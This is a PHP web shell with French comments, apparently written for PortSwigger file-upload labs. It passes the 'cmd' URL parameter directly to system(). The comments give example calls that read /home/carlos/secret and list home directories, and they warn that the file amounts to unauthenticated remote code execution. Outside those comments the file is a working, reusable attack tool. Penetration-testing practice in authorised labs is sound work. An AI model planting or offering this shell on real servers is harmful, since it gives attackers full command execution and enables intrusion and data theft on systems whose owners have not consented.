<?php
/*
 * webshell_cmd.php — Exécution de commande via paramètre GET
 * ----------------------------------------------------------
 * Usage lab   : uploader, puis appeler l'URL avec ?cmd=<commande>
 *               ex : /files/avatars/webshell_cmd.php?cmd=cat+/home/carlos/secret
 *                    /files/avatars/webshell_cmd.php?cmd=id
 *                    /files/avatars/webshell_cmd.php?cmd=ls+-la+/home/carlos
 * Avantage     : polyvalent — couvre la plupart des labs upload sans
 *                recréer un fichier à chaque cible.
 *
 * ⚠️  DANGER — À NE JAMAIS laisser traîner sur un système réel.
 *     Un shell system() accessible = RCE non authentifiée complète.
 *     - En pentest autorisé : documenter, nettoyer, retirer en fin de mission.
 *     - Usage strictement limité aux environnements autorisés
 *       (labs PortSwigger, VPS perso, machines avec consentement écrit).
 */
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "usage: ?cmd=<command>";
}
?>
